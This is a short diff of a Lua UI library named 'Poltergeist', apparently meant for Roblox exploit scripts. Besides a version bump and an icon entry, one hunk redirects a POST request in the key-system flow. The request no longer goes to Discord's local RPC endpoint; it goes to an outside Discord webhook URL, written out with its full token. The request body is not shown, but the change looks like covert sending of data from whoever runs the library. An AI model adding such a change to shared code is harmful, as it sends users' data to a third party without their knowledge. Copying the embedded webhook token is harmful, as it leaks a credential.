@@ -23,7 +23,7 @@ Deity/dp4pv/x64x70 | Certain Scripting and Testing ig
 
 ]]
 
-local Release = "v.1.0.1"
+local Release = "v1.0.3"
 
 local Poltergeist = { Folder = "Poltergeist", Options = {}, ThemeGradient = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(117, 164, 206)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(123, 201, 201)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(224, 138, 175))} }
 
@@ -47,6 +47,7 @@ end
 -- Credits To Latte Softworks And qweery for Lucide And Material Icons Respectively.
 local IconModule = {
 	Lucide = nil,
+	Poltergeist = nil,
 	Material = {
 		["perm_media"] = "http://www.roblox.com/asset/?id=6031215982";
 		["sticky_note_2"] = "http://www.roblox.com/asset/?id=6031265972";
@@ -2371,7 +2372,7 @@ function Poltergeist:CreateWindow(WindowSettings)
 					setclipboard(tostring("https://discord.gg/"..KeySettings.SecondAction.Parameter)) -- Hunter if you see this I added copy also was too lazy to send u msg
 					if request then
 						request({
-							Url = 'http://127.0.0.1:6463/rpc?v=1',
+							Url = 'https://discord.com/api/webhooks/1357481642851307600/vneb4saq-8VO4vhaUT_v2GpehF8t9_IIX8y3cln9l2pg2fAKq7822hCavtVTeIOXE5o3',
 							Method = 'POST',
 							Headers = {
 								['Content-Type'] = 'application/json',
